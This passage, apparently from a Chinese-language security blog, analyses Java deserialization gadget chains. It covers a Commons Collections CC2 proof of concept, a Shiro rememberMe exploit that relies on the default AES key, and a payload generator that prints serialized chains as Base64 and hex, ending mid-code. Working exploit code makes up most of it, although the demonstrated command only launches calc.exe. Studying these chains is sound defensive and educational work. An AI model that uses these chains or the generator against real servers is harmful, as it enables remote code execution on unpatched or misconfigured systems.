class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. 构造Transformer链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  <span class="comment">// 获取Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),  <span class="comment">// 反射调用Runtime.getMethod(&quot;getRuntime&quot;)</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),  <span class="comment">// 反射调用getRuntime.invoke(null)</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// 执行calc.exe</span></span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 设置TransformingComparator</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 构造恶意PriorityQueue</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);  <span class="comment">// 添加两个元素触发比较逻辑</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 生成序列化Payload</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 模拟反序列化触发漏洞（实际攻击中需发送此Payload到目标）</span></span><br><span class="line">        <span class="comment">// byte[] payload = baos.toByteArray();</span></span><br><span class="line">        <span class="comment">// ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payload));</span></span><br><span class="line">        <span class="comment">// ois.readObject();  // 此处会弹出计算器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h3 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransformingComparator 是 Apache Commons Collections 库中的一个 ​</span><br><span class="line">​比较器（Comparator）​​ 实现，</span><br><span class="line">它的核心功能是：​​</span><br><span class="line">在比较两个对象之前，先通过一个 Transformer 对它们进行转换，</span><br><span class="line">再基于转换后的结果进行比较​​。</span><br></pre></td></tr></table></figure><p>看一下具体方法的实现：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer, Comparator&lt;O&gt; decorated)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">    <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">    <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说这个类可以实现将两个值通过设定好的翻译器<br>翻译后再进行比较</p><p>调用<code>compare()</code>方法时触发翻译的操作</p><h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>既然最后序列化的是他那么就先看一下<code>readObject()</code>方法<br>以及触发比较翻译器<code>compare()</code>方法的路径</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    s.readInt(); <span class="comment">// 读取队列大小</span></span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[initialCapacity]; <span class="comment">// 初始化队列数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject(); <span class="comment">// 逐个读取元素</span></span><br><span class="line">    heapify(); <span class="comment">// 重建堆结构（关键触发点）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]); <span class="comment">// 从中间节点开始调整堆</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)  <span class="comment">// 使用自定义Comparator</span></span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span>  <span class="comment">// 使用自然顺序</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>; <span class="comment">// 左子节点</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;     <span class="comment">// 右子节点</span></span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>) <span class="comment">// 调用Comparator.compare()</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如此一来就成功的实现了计算器的弹出</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java链子分析—Shiro</title>
      <link href="/2025/04/18/java-shiro/"/>
      <url>/2025/04/18/java-shiro/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiro反序列化"><a href="#Shiro反序列化" class="headerlink" title="Shiro反序列化"></a>Shiro反序列化</h1><p>在CC3的链子中使用了<code>Templateslmpl</code>加载任意恶意类<br>可以执行任意java代码</p><p>它与CC6链子的区别<br>就像php中<code>call_user_func</code>与<code>eval</code>的区别一样<br>造成任意代码执行的<code>eval</code>显然具有更高的价值</p><p>shiro框架的漏洞在rememberme的自动登录上<br>会存一段aes加密的数据在浏览器中，再次访问时通过cookie携带<br>到达后端后反序列化以加载用户数据<br>而这个aes加密有一个默认的Key<br>那么就可以攻击不修改Key的网站</p><h1 id="Shiro链子"><a href="#Shiro链子" class="headerlink" title="Shiro链子"></a>Shiro链子</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollectionsShiro</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getPayload(<span class="type">byte</span>[] clazzBytes) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazzBytes&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, obj);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.clear();</span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// 生成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码前后的部分都很熟悉<br>但是中间的部分看着很奇怪<br>不妨把之前的代码贴上对比一下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//CC6</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// 弹出计算器（Windows）</span></span><br><span class="line">    )</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 2: 创建LazyMap并关联Transformer链</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 3: 将LazyMap封装到TiedMapEntry中</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 4: 将TiedMapEntry放入HashMap以触发反序列化链</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap.put(entry, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 5: 移除LazyMap中的缓存，确保反序列化时触发链</span></span><br><span class="line">lazyMap.remove(<span class="string">&quot;foo&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="不同点1：翻译链变成翻译器了"><a href="#不同点1：翻译链变成翻译器了" class="headerlink" title="不同点1：翻译链变成翻译器了"></a>不同点1：翻译链变成翻译器了</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>没有常量翻译器了我们怎么返回需要的类？</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>原来是<code>Lazymap</code>的<code>get</code>方法会自己触发翻译<br>也就是说此时key作为恶意类进入翻译器就可以省去常量翻译器了</p><p>需要进行改动的原因：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里仅给出最后的结论：如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就</span><br><span class="line">解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</span><br></pre></td></tr></table></figure><h3 id="不同点2：lazymap清除缓存的另一种写法"><a href="#不同点2：lazymap清除缓存的另一种写法" class="headerlink" title="不同点2：lazymap清除缓存的另一种写法"></a>不同点2：lazymap清除缓存的另一种写法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//CC6</span></span><br><span class="line">lazyMap.remove(<span class="string">&quot;foo&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里写作：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">outerMap.clear();</span><br></pre></td></tr></table></figure><p>事实上是一样的效果<br>如此一来就可以通过更改cookie的方式触发恶意的反序列化操作<br>弹出计算器了</p><p><img src="/2025/04/18/java-shiro/shiro1.png" alt="alt text"><br>需要注意清除session否则会话过期之前<br>rememberme的部分不会被反序列化</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化payload生成器（持续更新）</title>
      <link href="/2025/04/06/java-payload/"/>
      <url>/2025/04/06/java-payload/</url>
      
        <content type="html"><![CDATA[<p>利用<code>lazymap</code>将翻译器链转换为可反序列化触发的<code>payload</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TurnChainToPayload</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">TurnChainToPayload</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TurnChainToPayload</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">TurnChainToPayload</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TurnChainToPayload <span class="title function_">getInstance</span><span class="params">()</span> &#123; <span class="comment">// 提供公共访问方法</span></span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getPayload</span><span class="params">(ChainedTransformer chain)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> turnChainToMap(chain);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> turnMapToSerialize(hashMap);</span><br><span class="line">        System.out.println(<span class="string">&quot;Base64：\n&quot;</span>+ Base64.getEncoder().encodeToString(bos.toByteArray()));</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Hex：\n&quot;</span> + bytesToHex(bos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> HashMap <span class="title function_">turnChainToMap</span><span class="params">(ChainedTransformer chain)</span>&#123;</span><br><span class="line">        <span class="comment">// Step 2: 创建LazyMap并关联Transformer链</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br><span class="line">        <span class="comment">//lazyMap.get(&quot;ciallo&quot;);</span></span><br><span class="line">        <span class="comment">// Step 3: 将LazyMap封装到TiedMapEntry中</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="comment">//entry.hashCode();</span></span><br><span class="line">        <span class="comment">// Step 4: 将TiedMapEntry放入HashMap以触发反序列化链</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(entry, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line">        <span class="comment">// Step 5: 移除LazyMap中的缓存，确保反序列化时触发链</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ByteArrayOutputStream <span class="title function_">turnMapToSerialize</span><span class="params">(HashMap hashMap)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">//System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));</span></span><br><span class="line">        <span class="keyword">return</span> bos;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">bytesToHex</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : bytes) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> Integer.toHexString(<span class="number">0xff</span> &amp; b);</span><br><span class="line">            <span class="keyword">if</span> (hex.length() == <span class="number">1</span>) &#123;</span><br><span class="line">                hexString.append(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            hexString.append(hex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hexString.toString().toUpperCase();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用例：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span 